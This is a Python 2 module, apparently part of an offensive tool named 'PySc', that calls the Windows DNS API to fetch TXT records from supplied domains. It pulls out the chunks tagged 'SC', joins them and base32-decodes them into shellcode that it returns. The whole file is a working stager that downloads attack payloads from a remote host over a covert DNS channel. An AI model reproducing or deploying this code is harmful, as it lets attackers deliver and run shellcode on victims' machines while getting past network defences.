# !/usr/bin/python
# -*- coding: utf-8 -*-

#

"""
	PySc DNS Request
	This module contains the logic for the following checks .:

	- dnsrequest --> Retrieves shellcode from DNS Server
"""

from base64 import b32decode
from re import compile
from ctypes.wintypes import DWORD, LPSTR, WORD
from ctypes import *

dnsapi = windll.dnsapi

def dnsrequest(reqtype, dns_targets, debug):

    # attempt to retrieve shellcode from remote DNS record (TXT)

    try:

        class _DnsRecordFlags(Structure):
            _fields_ = [
                ('Section', DWORD, 2),
                ('Delete', DWORD, 1),
                ('CharSet', DWORD, 2),
                ('Unused', DWORD, 3),
                ('Reserved', DWORD, 24),
        ]

        DNS_RECORD_FLAGS = _DnsRecordFlags

        class DNS_TXT_DATA(Structure):
            _fields_ = [
                ('dwStringCount', DWORD),
                ('pStringArray', LPSTR * 50),
        ]

        class DnsRecord_FLAG_DATA(Union):
            _fields_ = [
                ('DW', DWORD),
                ('S', DNS_RECORD_FLAGS),
        ]

        class DnsRecord_TXT_DATA(Union):
            _fields_ = [
                ('TXT', DNS_TXT_DATA),
                ('Txt', DNS_TXT_DATA),
                ('HINFO', DNS_TXT_DATA),
                ('Hinfo', DNS_TXT_DATA),
        ]

        class _DnsRecord(Structure):
            pass

        _DnsRecord._fields_ = [
                ('pNext', POINTER(_DnsRecord)),
                ('pName', LPSTR),
                ('wType', WORD),
                ('wDataLength', WORD),
                ('Flags', DnsRecord_FLAG_DATA),
                ('dwTtl', DWORD),
                ('dwReserved', DWORD),
                ('Data', DnsRecord_TXT_DATA),
            ]

        DNS_RECORD = _DnsRecord

        precord = pointer(pointer(DNS_RECORD()))

        DNS_TYPE_TEXT = 0x0010
        DNS_QUERY_STANDARD = 0x00000001
        DNS_QUERY_BYPASS_CACHE = 0x00000008
        DNS_QUERY_NO_HOSTS_FILE = 0x00000040
        DNS_QUERY_NO_NETBT = 0x00000080
        DNS_QUERY_NO_MULTICAST = 0x00000800
        DNS_QUERY_TREAT_AS_FQDN = 0x00001000
        DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE  = 0x00000001
        DNS_QUERY_WIRE_ONLY = 0x100
        DNS_QUERY_USE_TCP_ONLY = 0x00000002

        if reqtype == 'udp':
            if debug:
                print ' [>] Checking DNS using %s' % reqtype.upper()
            Options = \
                    DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE | \
                    DNS_QUERY_NO_HOSTS_FILE | DNS_QUERY_NO_NETBT | \
                    DNS_QUERY_NO_MULTICAST | DNS_QUERY_TREAT_AS_FQDN | \
                    DNS_QUERY_WIRE_ONLY
        elif reqtype == 'tcp':
            if debug:
                print ' [>] Checking DNS using %s' % reqtype.upper()
            Options = \
                    DNS_QUERY_STANDARD | DNS_QUERY_BYPASS_CACHE | \
                    DNS_QUERY_NO_HOSTS_FILE | DNS_QUERY_NO_NETBT | \
                    DNS_QUERY_NO_MULTICAST | DNS_QUERY_TREAT_AS_FQDN | \
                    DNS_QUERY_WIRE_ONLY | DNS_QUERY_USE_TCP_ONLY | \
                    DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE
        else:
            if debug:
                print ' [!] Unable to select protocol type'
            return

        scarray = {}
        records = 0 # start key at 0 to maintain order
        ref_iter = 0

        for dns_entry in dns_targets:

            # Loop through the provided DNS names and gather
            # TXT records to check

            dnsquery = dnsapi.DnsQuery_A(
                    dns_entry,
                    DNS_TYPE_TEXT,
                    Options,
                    False,
                    precord,
                    False,
                    )

            if not dnsquery == 0:
                if debug:
                    print ' [!] Unable to get TXT record from %s' \
                        % dns_entry
                break

            dnsvalue = precord.contents
            screg = compile('^SC[0-9]') # match S1_ etc...

            # for every answer check for shellcode and merge into array
            # (minus marker. Marker in below exmaple is SC1
            # example: "SC17TUISAAAABQITZJR2JSIWURQRNJAZC2SCSFX...."

            while True:
                try:
                    ref_iter = ref_iter + records
                    records = dnsvalue.contents.Data.TXT.dwStringCount
                    i = 0
                    sctest = ''

                    while i < records:
                        ref = i + ref_iter
                        if dnsvalue.contents.Data.TXT.pStringArray[i] != None:
                            sctest = dnsvalue.contents.Data.TXT.pStringArray[i]
                            if screg.match(sctest[0:3]):
                                scarray[ref] = sctest[3:]
                        i = i +1
                    dnsvalue = dnsvalue.contents.pNext
                except ValueError:
                    # no more data to process
                    break
                except Exception, error:
                    if debug:
                        print ' [!] Error ::: %s' % error
                        # No more records
                    break

        # join each peice of shellcode

        txtvalue =''
        for scentry in scarray.values():
            txtvalue += scentry

        if not txtvalue:
            if debug:
                print ' [!] No shellcode Found within TXT records'
            return
        else:
            try:
                shellcode = b32decode(txtvalue)
                if debug:
                    print ' [>] Returning shellcode from DNS (TXT records)'
                return shellcode
            except:
                if debug:
                    print ' [!] Cannot decode shellcode from DNS'
                return
    except Exception, error:
        if debug:
            print ' [!] Error ::: %s' % error
        return